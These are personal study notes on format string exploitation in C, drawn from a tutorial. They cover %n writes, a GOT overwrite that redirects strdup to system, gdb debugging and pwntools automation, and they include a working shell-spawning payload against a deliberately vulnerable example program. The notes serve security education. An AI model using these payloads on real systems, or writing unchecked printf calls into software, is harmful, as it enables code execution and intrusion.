##### notes from:
`https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html`


- Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error. 

- If the programmer passes an attacker-controlled buffer as the argument to a `printf` (or any of the related functions, including `sprintf`, `fprintf`, etc), the attacker can perform writes to arbitrary memory addresses. The following program contains such an error:

```c
#include<stdio.h>
int main(int argc, char** argv) {
    char buffer[100];
    strncpy(buffer, argv[1], 100);
    printf(buffer);
    return 0;
}
```


# format functions that use format strings
```c

Besides printf(), there are a number of format functions that uses format strings to produce output. For example in C, there are:

printf(), fprintf(), sprintf(), snprintf(), printf_s(), fprintf_s(), sprintf_s(), snprintf_s(), and so on.


FOR MORE: 
[C docs](https://devdocs.io/c/io/fprintf)
	for more info about these functions
```


- %p
	- writes an implementation defined character sequence defining a **pointer**.
	- displays a pointer to a function, variable, etc

- %n
	- returns the **number of characters written** so far by this call to the function.
	- The result is _written_ to the value pointed to by the argument. The specification may not contain any _flag_, _field width_, or _precision_.


- %g
	- converts **floating-point number** to decimal or decimal exponent notation depending on the value and the _precision_.

- %a
	- converts **floating-point number** to the hexadecimal exponent notation.
	- For the `a` conversion style _[-]_`0x`_h.hhh_`p`_±d_ is used.  
	- For the `A` conversion style _[-]_`0X`_h.hhh_`P`_±d_ is used.

	- The first hexadecimal digit is not `0` if the argument is a normalized floating point value. If the value is `0`, the exponent is also `0`. _Precision_ specifies the exact number of digits to appear after the hexadecimal point character. 
	
	- The default precision is sufficient for exact representation of the value. In the _alternative implementation_ decimal point character is written even if no digits follow it. For infinity and not-a-number conversion style see notes.


- %e
	- converts **floating-point number** to the decimal exponent notation.
	- For the `e` conversion style _[-]d.ddd_`e`_±dd_ is used.  
	- For the `E` conversion style _[-]d.ddd_`E`_±dd_ is used.

	- The exponent contains at least two digits, more digits are used only if necessary. If the value is `0`, the exponent is also `0`. _Precision_ specifies the exact number of digits to appear after the decimal point character. The default precision is `6`. In the _alternative implementation_ decimal point character is written even if no digits follow it. For infinity and not-a-number conversion style see notes.


- %f
	- converts **floating-point number** to the decimal notation in the style _[-]ddd.ddd_.
	- _Precision_ specifies the exact number of digits to appear after the decimal point character. The default precision is `6`. In the _alternative implementation_ decimal point character is written even if no digits follow it. For infinity and not-a-number conversion style see notes.

- %u
	- converts an **unsigned integer** into decimal representation _dddd_.
	- _Precision_ specifies the minimum number of digits to appear. The default precision is `1`. If both the converted value and the precision are `0` the conversion results in no characters.


- %x
	- converts an **unsigned integer** into hexadecimal representation _hhhh_.
	- For the `x` conversion letters `abcdef` are used.  
	- For the `X` conversion letters `ABCDEF` are used.  
	
	- _Precision_ specifies the minimum number of digits to appear. The default precision is `1`. If both the converted value and the precision are `​0​` the conversion results in no characters. In the _alternative implementation_ `0x` or `0X` is prefixed to results if the converted value is nonzero.


- %o
	- converts an **unsigned integer** into octal representation _oooo_.
	- _Precision_ specifies the minimum number of digits to appear. The default precision is `1`. If both the converted value and the precision are `0` the conversion results in no characters. In the _alternative implementation_ precision is increased if necessary, to write one leading zero. In that case if both the converted value and the precision are `0`, single `0` is written.


- %d
	- converts a **signed integer** into decimal representation _[-]dddd_.
	- _Precision_ specifies the minimum number of digits to appear. The default precision is `1`.  
	- If both the converted value and the precision are `0` the conversion results in no characters.


- %s
	- writes a **character string**
	- The argument must be a pointer to the initial element of an array of characters. _Precision_ specifies the maximum number of bytes to be written. If _Precision_ is not specified, writes every byte up to and not including the first null terminator. If the **l** specifier is used, the argument must be a pointer to the initial element of an array of `wchar_t`, which is converted to char array as if by a call to `[wcrtomb](https://devdocs.io/c/string/multibyte/wcrtomb "c/string/multibyte/wcrtomb")` with zero-initialized conversion state.


- %c 
	- writes a **single character.
	- The argument is first converted to `unsigned char`. If the **L** modifier is used, the argument is first converted to a character string as if by **%ls** with a `wchar_t[2]` argument.



## More on %n (writing values)
 > The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.
 > 
 > If we were to pass the string `AAAA%10$n`, we would write the value 4 to the address `0x41414141`! We can use another `printf` feature to write larger values: if we do `printf("AAAA%100x")`, 104 characters will be output (because `%100x` prints the argument padded to at least 100 characters).
 > 
 We can do `AAAA%<value-4>x%10$n` to write an arbitrary value to `0x41414141`.
 > 
 The next thing to know is that almost certainly don't want to write all characters in one go, for example: 
 >
 if we want to write the value `0x0804a004`, we would have to write 134520836 characters to standard out! Instead, we break it up into two writes: 
 
 - first we write `0x0804` (2052) to the higher two bytes of the target address and then we write `0xa004` (40964) to the lower two bytes of the target address. 
 - To do this, we will use `%hn` to write only 2 bytes at a time.
 
 - Such a format string might look like this: `CAAAAAAA%2044x%10$hn%38912x%11$hn`. Lets break this down so we can understand it.
	- `CAAAAAAA` - this is the higher two bytes of the target address (`0x41414143`) and the lower two bytes of the target address (`0x41414141`)
	
	- `%2044x%10$hn` - since we want to have written a total of 2052 bytes when we get to the first `%hn`, and we have already written 8 bytes so far, we need to write an addition 2044 bytes.
			
	- `%38912x%11$hn` - since we want to have written a total of 40964 bytes when we get to the second `%hn`, and we since we have already written 2052 bytes so far, we need to write an additional 38912 bytes.



##### Here is an example of how this might be used
```python
./a.out "$(python -c 'import sys; sys.stdout.write("CAAAAAAA%2044x%10$hn%38912x%11$hn")')"
```


# Arbitrary Write > CE via GOT Overwrite
- Since a format string vulnerability gives us the ability to write an arbitrary value to an arbitrary address, we can do a lot of things with it.
	- Usually the easiest thing to do is write to a function pointer somewhere.
	- and turn our arbitrary write primitive into arbitrary code execution.


## Process Of Getting Code Execution
- In `dynamically linked programs`, these are easy to find when a program attempts to execute a function in a shared library.

- it `does not necessarily know the location of that function at compile time`. Instead, it `jumps` to a `stub function` that `has a pointer to the correct location` of the function in the shared library. 

- This `pointer` (located in the global offset table, or `GOT`) is initialized at runtime when the `stub function is first called`.
	- For example, when `strcat` is used in a program, the following piece of stub code allows the program to find the correct location in the shared library `libc` at run time:
```bash
$ objdump -d a.out
... <snip> ...
08048330 <strcat@plt>:
 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004
 8048336:       68 08 00 00 00          push   $0x8
 804833b:       e9 d0 ff ff ff          jmp    8048310 <_init+0x3c>
... <snip> ...
```
- Here you can see that the `stcat@plt` is the stub function that jumps to GOT entry for `strcat` (the address `0x804a004`)

- We can write any value we want to `0x804a004`. When `strcat` is used later in the program, the program will instead transfer code execution to the value we specified.

- A common technique is to overwrite the GOT entry with the address of the function `system`, thereby turning a call of `strcat(buffer, "hello")` into the call `system(buffer)` (if we can control the contents of `buffer`, we can get a shell!).


### Example
```c
#include <stdio.h>
#include <string.h>
// compile with gcc -m32 temp.c

int main(int argc, char** argv) {
  printf(argv[1]);
  strdup(argv[1]);
}
```
- GAME PLAN:
	- overwrite the GOT entry of `strdup` with the address of `system`, so the program will `printf(argv[1])` then `system(argv[1])`.
	
	- Hence, our payload must be a valid argument to `system` - we will start our payload with `sh;#` 
	
	- which will be `sh` and cause the rest of the payload to be a comment. This also has the advantage of being exactly 4 bytes long, which isn't important for this example but is very useful in other cases
```python
$ env -i ./a.out "$(python -c 'import sys; sys.stdout.write("sh;#AAAABBBB%00000x%17$hp%00000x%18$hp")')"
sh;#AAAABBBB00xf7fcbff48048449(nil)
```
- Our goal is to find the correct offsets (instead of 17 and 18) so that the we output `sh;#AAAABBBB<garbabe>0x41414141<garbage>0x42424242`. This takes some work, but in our case the correct offsets are 99 and 100:
```bash
$ env -i ./a.out "$(python -c 'import sys; sys.stdout.write("sh;#AAAABBBB%00000x%99$hp%00000x%100$hp")')"
sh;#AAAABBBB00x4141414180484490x42424242
```

##### finding the `strdup` GOT entry:
```bash
$ objdump -d a.out
... <snip> ...
08048330 <strdup@plt>:
 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004
 8048336:       68 08 00 00 00          push   $0x8
 804833b:       e9 d0 ff ff ff          jmp    8048310 <_init+0x3c>
```
- Now we know where to write. We want to write the address of `system` to the `strdup` got entry, `0x804a004`.
- For now, we plug in our address into the payload and make sure everything still works out:
```bash
$ env -i ./a.out "$(python -c 'import sys; sys.stdout.write("sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%00000x%99$hp%00000x%100$hp")')"
sh;#00x804a00480484490x804a006
```

```bash
# SIDE NOTE:
	- disable LIBC randomization via: $ ulimit -s unlimited
```
- Now the address of `system` is at a deterministic location in memory. We can just open up the program in `gdb` and print the address of `system`:
```bash
$ gdb -q a.out
Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048417
(gdb) r
Starting program: /home/ppp/a.out 

Breakpoint 1, 0x08048417 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0x555c2250 <system>
```
- All right, now we know that we need to write `0x555c2250` (the address of system) to the address `0x804a004` (the got entry of `strdup`). We are doing this in two parts. First, we write `0x2250` to the two bytes at `0x804a004` then we write `0x555c` to the two bytes at `0x804a006`. We can figure out how many bytes to write in python:
```python
$ python
>>> 0x2250 - 12 # We've already written 12 bytes ("sh;#AAAABBBB").
8772
>>> 0x555c - 0x2250 # We've already written 0x2250 bytes.
13068
```

- Now we plug these values into our payload, change the `%hp` to `%hn`. Note that when we change the `%00000x` to `%08772`, we leave the leading `0` so that our string stays the same length. Here is the final exploit:
```bash
$ env -i ./a.out "$(python -c 'import sys; sys.stdout.write("sh;#\x04\xa0\x04\x08\x06\xa0\x04\x08%08772x%99$hn%13068x%100$hn")')"

sh;#..<garbage>..sh-4.2$
```
- `Woo hoo, we got our shell!``


## Debugging an exploit
- you need to make sure your environment looks like the environment used by `gdb`. We first see what the stack looks like under `gdb` and then always run our exploit with that `environment`:
```bash
$ env -i /usr/bin/printenv

$ gdb -q /usr/bin/printenv
Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.

(gdb) unset env
Delete all environment variables? (y or n) y

(gdb) r
Starting program: /usr/bin/printenv 
PWD=/home/ppp
SHLVL=0
```

- Now that we know the environment used by `gdb`, we can make sure to always execute our payload with the same environment so we can test our exploit in `gdb`:
```bash
$ env -i PWD=$(pwd) SHLVL=0 ./a.out "$(python -c 'print "my_exploit_string"')" # Outside gdb.

$ gdb ./a.out # Inside gdb.

(gdb) unset env
Delete all environment variables? (y or n) y

(gdb) r "$(/usr/bin/python -c 'print "my_exploit_string"')"
```

- The most helpful thing to do in `gdb` is to break just before the call to `printf` and make sure the argument and the stack stack is what you expect (if you expect to use `%10$hn`, make sure the value you control is the 10th argument after the format string).
```bash
Breakpoint 1, 0x080484ae in main ()

(gdb) x/2i $pc
=> 0x80484ae <main+74>: call   0x8048360 <printf@plt>
   0x80484b3 <main+79>: mov    $0x0,%eax
   
(gdb) x/a $esp
0xffffdb70: 0xffffdb98

(gdb) x/s 0xffffdb98
0xffffdb98:  "AAAA%10$p"

(gdb) x/11a $esp
0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289
0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4
0xffffdb90: 0xffffdc44  0x0 0x41414141

(gdb) x/a $esp + 40
0xffffdb98: 0x41414141
```


---
### manually exploiting format string vulns
  
on 32bit our exploit will look like this:

```
[padding][address]%[value]c%[index]$[write_type]
```

while on 64 bit our exploit will look like this:

```
%[value]c%[index]$[write_type][padding][address]
```



# Automating Exploitation With Pwntools

```python
# Assume a process that reads a string
# and gives this string as the first argument
# of a printf() call
# It do this indefinitely
p = process('./vulnerable')

# Function called in order to send a payload
def send_payload(payload):
        log.info("payload = %s" % repr(payload))
        p.sendline(payload)
        return p.recv()

# Create a FmtStr object and give to him the function
format_string = FmtStr(execute_fmt=send_payload)
format_string.write(0x0, 0x1337babe) # write 0x1337babe at 0x0
format_string.write(0x1337babe, 0x0) # write 0x0 at 0x1337babe
format_string.execute_writes()
```
- for more information & payload generation visit:
	- https://docs.pwntools.com/en/stable/fmtstr.html


---




# NOTES: 
- `$` is a special symbol on the shell and would otherwise need to be escaped.

- You'll note that we use print the exploit string in a python subshell. This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters and use arbitrary bytes in our payload is very useful.

- We also print via `sys.stdout.write` to prevent the newline at the end we would get if we otherwise used `print` and surround the subshell in double quotes in case the payload had whitespace in it

